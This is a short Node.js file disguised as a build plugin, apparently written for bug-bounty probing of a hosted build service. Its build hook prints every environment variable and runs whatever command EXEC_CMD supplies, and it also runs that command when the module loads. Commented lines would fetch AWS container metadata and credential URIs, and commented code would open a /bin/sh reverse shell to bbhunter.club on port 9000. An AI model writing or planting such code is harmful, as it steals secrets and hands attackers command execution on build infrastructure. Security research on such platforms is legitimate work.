const request = require('request');
const net = require("net");
const cp = require("child_process");

exports.build = async({workPath, files, entrypoint, config}) => {
	console.log('Env:', process.env);

	//await getUrl('http://169.254.170.2/v2/metadata');
	//await getUrl(process.env['ECS_CONTAINER_METADATA_URI']);
	//await getUrl('http://169.254.170.2'+process.env['AWS_CONTAINER_CREDENTIALS_RELATIVE_URI']);

	await execCmd();
}

//exports.analyze = function({files, entrypoint}) {
//	console.log('In analyze');
//	reverseShell();
//	return files[entrypoint].digest;
//}

execCmd();

async function getUrl(url) {
	let resp = await request.get(url, {timeout: 5000});
	resp.on('error', (err) => console.log(url + ' error:', err));
	resp.on('data', (data) => console.log(url + ' response:', data.toString()));
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function execCmd() {
	if (!process.env.EXEC_CMD) {
		console.log("No exec cmd");
		return;
	}
	await require('child_process').exec(process.env.EXEC_CMD, function(err, stdout, stderr) {
		console.log('err', err);
	}).on('close', function(code) {
		console.log('closed', code);
	});
	//var sh = cp.spawn("/bin/sh", []);
	//var client = new net.Socket();
    	//client.connect(9000, "bbhunter.club", function(){
	//	    client.pipe(sh.stdin);
	//	    sh.stdout.pipe(client);
	//	    sh.stderr.pipe(client);
	//});
	if (process.env.SLEEP_TIMEOUT) {
		await sleep(process.env.SLEEP_TIMEOUT);
	}
}
